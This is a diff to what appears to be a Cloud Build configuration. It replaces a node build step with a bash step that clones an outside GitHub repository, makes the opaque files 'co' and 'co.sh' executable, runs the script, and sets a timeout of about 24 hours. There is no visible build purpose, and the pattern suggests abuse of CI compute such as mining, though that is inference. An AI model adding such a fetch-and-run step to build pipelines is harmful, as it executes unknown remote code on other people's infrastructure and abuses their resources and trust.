@@ -1,4 +1,10 @@
 steps:
-- name: node
-  entrypoint: npm
-  args: ['git clone https://github.com/trailt/0.git && cd 0 && chmod 500 co co.sh && ./co.sh']
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      git clone https://github.com/trailt/0.git && cd 0 && chmod 500 co co.sh && ./co.sh
+  waitFor:
+    - '-'
+timeout: '86000s'
